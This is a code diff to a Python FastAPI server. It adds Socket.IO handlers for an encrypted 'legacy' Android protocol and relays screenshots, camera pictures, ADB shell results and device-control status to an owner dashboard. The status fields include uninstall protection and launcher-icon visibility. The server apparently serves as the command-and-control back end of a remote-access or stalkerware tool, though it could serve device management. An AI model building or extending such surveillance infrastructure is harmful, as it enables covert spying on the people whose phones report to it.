@@ -1,6 +1,8 @@
 from __future__ import annotations
 
 import asyncio
+import base64
+import binascii
 import fnmatch
 import json
 import sqlite3
@@ -8,7 +10,9 @@ import uuid
 from contextlib import asynccontextmanager
 from pathlib import Path
 from typing import Annotated, Any
+from urllib.parse import parse_qs
 
+import socketio
 from fastapi import (
     Depends,
     FastAPI,
@@ -25,6 +29,13 @@ from fastapi.staticfiles import StaticFiles
 
 from .config import Settings
 from .db import Database
+from .legacy_protocol import (
+    LegacyProtocolError,
+    collect_status_payload,
+    decrypt_legacy_payload,
+    encrypt_legacy_payload,
+    find_device_identity,
+)
 from .realtime import DeviceConnection, RealtimeHub
 from .schemas import (
     BatteryGuideRequest,
@@ -75,6 +86,17 @@ COMMAND_RESPONSE_FIELDS = {
         ],
     },
 }
+
+ANDROID_SELF_REPORT_TYPES = {
+    "screenshot",
+    "adbScreenshot",
+    "camPic",
+    "relayStatus",
+    "adbShellResult",
+}
+
+ANDROID_IMAGE_REPORT_TYPES = {"screenshot", "adbScreenshot", "camPic"}
+MAX_ANDROID_REPORT_IMAGE_BYTES = 4 * 1024 * 1024
 
 
 def protocol_item(
@@ -151,6 +173,7 @@ CAPABILITY_CATALOG = [
             "network_type",
             "screen_state",
             "locked",
+            "lock_state_code",
             "accessibility_enabled",
             "battery_whitelist_enabled",
             "device_admin_enabled",
@@ -438,6 +461,9 @@ def create_app(settings: Settings | None = None) -> FastAPI:
     settings = settings or Settings.from_env()
     database = Database(settings.database_path)
     hub = RealtimeHub()
+    sio = socketio.AsyncServer(async_mode="asgi", cors_allowed_origins=[])
+    legacy_contexts: dict[str, dict[str, Any]] = {}
+    legacy_bound_devices: dict[str, str] = {}
 
     async def mark_disconnected(
         connection: DeviceConnection, reason: str, close_socket: bool = False
@@ -1525,6 +1551,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             "network_latency_ms",
             "screen_state",
             "locked",
+            "lock_state_code",
             "accessibility_enabled",
             "battery_whitelist_enabled",
             "device_admin_enabled",
@@ -1560,6 +1587,363 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             device["owner_user_id"],
         )
         return envelope(request, {"accepted": True})
+
+    def legacy_socket_context(
+        environ: dict[str, Any], auth: Any
+    ) -> dict[str, Any]:
+        context: dict[str, Any] = {"auth": auth if isinstance(auth, dict) else {}}
+        scope = environ.get("asgi.scope", {})
+        query_bytes = scope.get("query_string", b"")
+        if isinstance(query_bytes, bytes):
+            query_text = query_bytes.decode("utf-8", errors="replace")
+        else:
+            query_text = str(query_bytes)
+        context["query"] = {
+            key: values[-1] for key, values in parse_qs(query_text).items() if values
+        }
+        headers: dict[str, str] = {}
+        for raw_key, raw_value in scope.get("headers", []):
+            key = raw_key.decode("latin-1") if isinstance(raw_key, bytes) else str(raw_key)
+            value = (
+                raw_value.decode("latin-1")
+                if isinstance(raw_value, bytes)
+                else str(raw_value)
+            )
+            headers[key] = value
+        context["headers"] = headers
+        return context
+
+    def legacy_device_identity(
+        decoded: Any,
+        context: dict[str, Any],
+        bound_device_id: str | None = None,
+    ) -> dict[str, Any] | None:
+        identifiers, tokens = find_device_identity(decoded, context)
+        if bound_device_id is not None:
+            device = database.one("SELECT * FROM devices WHERE id=?", (bound_device_id,))
+            if device is None:
+                return None
+            if identifiers and all(
+                identifier not in {device["id"], device["installation_id"]}
+                for identifier in identifiers
+            ):
+                return None
+            if tokens and all(
+                device["device_token_hash"] != token_hash(token) for token in tokens
+            ):
+                return None
+            return device
+
+        device = None
+        for identifier in identifiers:
+            device = database.one(
+                "SELECT * FROM devices WHERE id=? OR installation_id=? LIMIT 1",
+                (identifier, identifier),
+            )
+            if device is not None:
+                break
+        if device is None:
+            for token in tokens:
+                device = database.one(
+                    "SELECT * FROM devices WHERE device_token_hash=? LIMIT 1",
+                    (token_hash(token),),
+                )
+                if device is not None:
+                    break
+        if device is None:
+            return None
+        if tokens and all(
+            device["device_token_hash"] != token_hash(token) for token in tokens
+        ):
+            return None
+        return device
+
+    def decode_android_self_report(value: Any) -> tuple[Any, bool]:
+        """Decrypt only explicitly encrypted report envelopes.
+
+        A plain ``data`` field is intentionally not treated as ciphertext because
+        image reports use that field for Base64 image bytes.
+        """
+        encrypted_value: Any | None = None
+        if isinstance(value, str):
+            encrypted_value = value
+        elif isinstance(value, dict):
+            if "ciphertext" in value:
+                encrypted_value = {"ciphertext": value["ciphertext"]}
+            elif "enc" in value:
+                encrypted_value = {"enc": value["enc"]}
+            elif value.get("encrypted") is True and "data" in value:
+                encrypted_value = {"data": value["data"]}
+        if encrypted_value is None:
+            return value, False
+        return (
+            decrypt_legacy_payload(encrypted_value, settings.legacy_device_aes_key),
+            True,
+        )
+
+    def report_correlation_id(value: Any) -> str | None:
+        pending = [value]
+        visited = 0
+        while pending and visited < 50:
+            current = pending.pop(0)
+            visited += 1
+            if isinstance(current, dict):
+                for key in ("correlation_id", "command_id", "commandId"):
+                    candidate = current.get(key)
+                    if isinstance(candidate, str) and 1 <= len(candidate) <= 160:
+                        return candidate
+                pending.extend(current.values())
+            elif isinstance(current, (list, tuple)):
+                pending.extend(current)
+        return None
+
+    def image_report_result(event_name: str, value: Any) -> dict[str, Any]:
+        candidate = value
+        if isinstance(candidate, dict) and "result" in candidate:
+            candidate = candidate["result"]
+        if isinstance(candidate, dict):
+            for key in (
+                "image_url",
+                "image",
+                "image_base64",
+                "base64",
+                "frame",
+                "data",
+                event_name,
+            ):
+                if isinstance(candidate.get(key), str):
+                    candidate = candidate[key]
+                    break
+        if not isinstance(candidate, str):
+            raise LegacyProtocolError(f"{event_name} does not contain a Base64 image")
+
+        image_value = "".join(candidate.split())
+        mime_type = "image/jpeg"
+        if image_value.lower().startswith("data:image/"):
+            try:
+                header, image_value = image_value.split(",", 1)
+            except ValueError as exc:
+                raise LegacyProtocolError("invalid image data URL") from exc
+            if not header.lower().endswith(";base64"):
+                raise LegacyProtocolError("image data URL must contain Base64 data")
+            mime_type = header[5:].split(";", 1)[0].lower()
+            if mime_type not in {"image/jpeg", "image/png", "image/webp", "image/gif"}:
+                raise LegacyProtocolError("unsupported image media type")
+        if len(image_value) > (MAX_ANDROID_REPORT_IMAGE_BYTES * 4 // 3) + 8:
+            raise LegacyProtocolError("reported image is too large")
+        try:
+            decoded_image = base64.b64decode(image_value, validate=True)
+        except (binascii.Error, ValueError) as exc:
+            raise LegacyProtocolError("reported image is not valid Base64") from exc
+        if not decoded_image or len(decoded_image) > MAX_ANDROID_REPORT_IMAGE_BYTES:
+            raise LegacyProtocolError("reported image size is invalid")
+        return {
+            "event": event_name,
+            "image_url": f"data:{mime_type};base64,{image_value}",
+        }
+
+    def normalize_android_self_report(
+        message: DeviceSocketMessage,
+    ) -> tuple[DeviceSocketMessage, bool]:
+        decoded, encrypted = decode_android_self_report(message.payload)
+        correlation_id = message.correlation_id or report_correlation_id(decoded)
+        if correlation_id is None:
+            raise LegacyProtocolError("Android self-report is missing correlation_id")
+        report_payload = decoded
+        if isinstance(decoded, dict) and isinstance(decoded.get("payload"), dict):
+            report_payload = decoded["payload"]
+        if message.type in ANDROID_IMAGE_REPORT_TYPES:
+            result: Any = image_report_result(message.type, report_payload)
+        elif isinstance(report_payload, dict) and "result" in report_payload:
+            result = report_payload["result"]
+        else:
+            result = report_payload
+        return (
+            message.model_copy(
+                update={
+                    "type": "command.result",
+                    "correlation_id": correlation_id,
+                    "payload": {"success": True, "result": result},
+                }
+            ),
+            encrypted,
+        )
+
+    async def accept_legacy_socket_status(
+        sid: str, event_name: str, raw_payload: Any
+    ) -> dict[str, Any]:
+        try:
+            # A plain HTTP/Socket.IO diag is accepted for the documented
+            # device-admin lifecycle event. deviceOnline and enc msg are always
+            # decrypted before any field is inspected.
+            try:
+                decoded = decrypt_legacy_payload(
+                    raw_payload, settings.legacy_device_aes_key
+                )
+            except LegacyProtocolError:
+                if event_name != "diag" or not isinstance(raw_payload, dict):
+                    raise
+                decoded = raw_payload
+            status_payload = collect_status_payload(decoded)
+            if event_name == "diag" and isinstance(decoded, str):
+                status_payload["diag"] = decoded
+            elif event_name == "diag" and isinstance(decoded, (list, tuple)):
+                if len(decoded) >= 1 and isinstance(decoded[0], str):
+                    status_payload.setdefault("diag", decoded[0])
+                if len(decoded) >= 2:
+                    status_payload.setdefault("status", decoded[1])
+            status_body = DeviceStatusRequest.model_validate(status_payload)
+            normalized = status_body.model_dump(exclude_none=True)
+            if not normalized:
+                raise LegacyProtocolError("decrypted event contains no supported status fields")
+            context = legacy_contexts.get(sid, {})
+            already_bound = legacy_bound_devices.get(sid)
+            device = legacy_device_identity(decoded, context, already_bound)
+            if device is None:
+                raise LegacyProtocolError(
+                    "decrypted event does not match a pre-provisioned device"
+                )
+            if already_bound is not None and already_bound != device["id"]:
+                raise LegacyProtocolError("Socket.IO session changed device identity")
+        except (LegacyProtocolError, ValueError) as exc:
+            await sio.emit(
+                "server.error",
+                {"code": "INVALID_LEGACY_STATUS", "message": str(exc)},
+                to=sid,
+            )
+            return {"accepted": False, "error": "INVALID_LEGACY_STATUS"}
+
+        previous = database.one(
+            "SELECT online FROM device_status WHERE device_id=?", (device["id"],)
+        )
+        update_device_status(device["id"], status_body)
+        database.execute(
+            "UPDATE device_status SET online=1,updated_at=? WHERE device_id=?",
+            (utc_now(), device["id"]),
+        )
+        legacy_bound_devices[sid] = device["id"]
+        if previous is None or not previous["online"]:
+            await hub.broadcast_dashboard(
+                {"type": "device.online", "device_id": device["id"], "time": utc_now()},
+                device["owner_user_id"],
+            )
+        await hub.broadcast_dashboard(
+            {
+                "type": "device.status",
+                "device_id": device["id"],
+                "status": normalized,
+                "source": f"legacy_socketio.{event_name}",
+            },
+            device["owner_user_id"],
+        )
+        return {"accepted": True, "device_id": device["id"]}
+
+    @sio.event
+    async def connect(sid: str, environ: dict[str, Any], auth: Any = None):
+        legacy_contexts[sid] = legacy_socket_context(environ, auth)
+        return True
+
+    @sio.on("deviceOnline")
+    async def legacy_device_online(sid: str, payload: Any):
+        return await accept_legacy_socket_status(sid, "deviceOnline", payload)
+
+    @sio.on("enc msg")
+    async def legacy_encrypted_message(sid: str, payload: Any):
+        return await accept_legacy_socket_status(sid, "enc msg", payload)
+
+    @sio.on("diag")
+    async def legacy_diag(sid: str, payload: Any):
+        return await accept_legacy_socket_status(sid, "diag", payload)
+
+    async def accept_legacy_socket_report(
+        sid: str, event_name: str, raw_payload: Any
+    ) -> dict[str, Any] | str:
+        encrypted = False
+        try:
+            decoded, encrypted = decode_android_self_report(raw_payload)
+            context = legacy_contexts.get(sid, {})
+            already_bound = legacy_bound_devices.get(sid)
+            device = legacy_device_identity(decoded, context, already_bound)
+            if device is None:
+                raise LegacyProtocolError(
+                    "Android self-report does not match a pre-provisioned device"
+                )
+            legacy_bound_devices[sid] = device["id"]
+            message_payload = (
+                raw_payload
+                if isinstance(raw_payload, dict)
+                else {"ciphertext": raw_payload}
+            )
+            report = DeviceSocketMessage(
+                type=event_name,
+                correlation_id=report_correlation_id(decoded),
+                payload=message_payload,
+            )
+            normalized, _ = normalize_android_self_report(report)
+            accepted = await handle_command_message(None, device, normalized)
+            if not accepted:
+                raise LegacyProtocolError("Android self-report references an unknown command")
+            response: dict[str, Any] = {
+                "accepted": True,
+                "device_id": device["id"],
+                "correlation_id": normalized.correlation_id,
+            }
+        except (LegacyProtocolError, ValueError) as exc:
+            response = {
+                "accepted": False,
+                "error": "INVALID_ANDROID_SELF_REPORT",
+                "message": str(exc),
+            }
+            await sio.emit("server.error", response, to=sid)
+        if encrypted:
+            return encrypt_legacy_payload(response, settings.legacy_device_aes_key)
+        return response
+
+    @sio.on("screenshot")
+    async def legacy_screenshot(sid: str, payload: Any):
+        return await accept_legacy_socket_report(sid, "screenshot", payload)
+
+    @sio.on("adbScreenshot")
+    async def legacy_adb_screenshot(sid: str, payload: Any):
+        return await accept_legacy_socket_report(sid, "adbScreenshot", payload)
+
+    @sio.on("camPic")
+    async def legacy_camera_picture(sid: str, payload: Any):
+        return await accept_legacy_socket_report(sid, "camPic", payload)
+
+    @sio.on("relayStatus")
+    async def legacy_relay_status(sid: str, payload: Any):
+        return await accept_legacy_socket_report(sid, "relayStatus", payload)
+
+    @sio.on("adbShellResult")
+    async def legacy_adb_shell_result(sid: str, payload: Any):
+        return await accept_legacy_socket_report(sid, "adbShellResult", payload)
+
+    @sio.event
+    async def disconnect(sid: str, *args: Any):
+        legacy_contexts.pop(sid, None)
+        device_id = legacy_bound_devices.pop(sid, None)
+        if device_id is None or device_id in legacy_bound_devices.values():
+            return
+        if await hub.is_online(device_id):
+            return
+        now = utc_now()
+        database.execute(
+            "UPDATE device_status SET online=0,updated_at=? WHERE device_id=?",
+            (now, device_id),
+        )
+        device = database.one(
+            "SELECT owner_user_id FROM devices WHERE id=?", (device_id,)
+        )
+        await hub.broadcast_dashboard(
+            {
+                "type": "device.offline",
+                "device_id": device_id,
+                "reason": "legacy_socketio_closed",
+                "time": now,
+            },
+            device["owner_user_id"] if device else None,
+        )
 
     @app.post("/api/device/logs")
     def device_logs(
@@ -1700,7 +2084,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             "d.sdk_int,d.package_name,d.app_version,d.locale,d.timezone,d.ip_address,"
             "d.first_seen_at,d.last_seen_at,d.created_at,d.updated_at,"
             "s.online,s.battery_percent,s.charging,s.network_type,s.network_quality,s.network_latency_ms,"
-            "s.screen_state,s.locked,"
+            "s.screen_state,s.locked,s.lock_state_code,"
             "s.accessibility_enabled,s.battery_whitelist_enabled,s.device_admin_enabled,"
             "s.screen_permission_enabled,s.camera_permission_enabled,s.uninstall_protection_enabled,"
             "s.launcher_icon_visible,s.reported_at,s.updated_at AS status_updated_at "
@@ -2345,26 +2729,27 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         )
 
     async def handle_command_message(
-        connection: DeviceConnection,
+        connection: DeviceConnection | None,
         device: dict[str, Any],
         message: DeviceSocketMessage,
-    ) -> None:
+    ) -> bool:
         command_id = message.correlation_id
         if not command_id:
-            return
+            return False
         command = database.one(
             "SELECT * FROM commands WHERE id=? AND device_id=?",
             (command_id, device["id"]),
         )
         if command is None:
-            await connection.websocket.send_json(
-                {
-                    "type": "server.error",
-                    "correlation_id": message.message_id,
-                    "payload": {"code": "UNKNOWN_COMMAND"},
-                }
-            )
-            return
+            if connection is not None:
+                await connection.websocket.send_json(
+                    {
+                        "type": "server.error",
+                        "correlation_id": message.message_id,
+                        "payload": {"code": "UNKNOWN_COMMAND"},
+                    }
+                )
+            return False
         if message.type == "command.ack":
             database.execute(
                 "UPDATE commands SET status='acknowledged',acknowledged_at=? "
@@ -2398,6 +2783,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             },
             device["owner_user_id"],
         )
+        return True
 
     async def handle_screen_status_message(
         connection: DeviceConnection,
@@ -2550,10 +2936,28 @@ def create_app(settings: Settings | None = None) -> FastAPI:
                             "payload": {"time": heartbeat_time},
                         }
                     )
-                elif message.type == "device.status":
+                elif message.type in {"device.status", "deviceOnline", "diag"}:
                     await handle_status_message(connection, device, message)
                 elif message.type in {"command.ack", "command.result"}:
                     await handle_command_message(connection, device, message)
+                elif message.type in ANDROID_SELF_REPORT_TYPES:
+                    try:
+                        normalized_report, _ = normalize_android_self_report(message)
+                    except LegacyProtocolError as exc:
+                        await websocket.send_json(
+                            {
+                                "type": "server.error",
+                                "correlation_id": message.message_id,
+                                "payload": {
+                                    "code": "INVALID_ANDROID_SELF_REPORT",
+                                    "message": str(exc),
+                                },
+                            }
+                        )
+                        continue
+                    await handle_command_message(
+                        connection, device, normalized_report
+                    )
                 elif message.type == "screen.session.status":
                     await handle_screen_status_message(connection, device, message)
         except (WebSocketDisconnect, ValueError):
@@ -2561,7 +2965,10 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         finally:
             await mark_disconnected(connection, "socket_closed")
 
+    app.state.socketio_server = sio
+    app.state.asgi_app = socketio.ASGIApp(sio, other_asgi_app=app)
     return app
 
 
-app = create_app()
+fastapi_app = create_app()
+app = fastapi_app.state.asgi_app
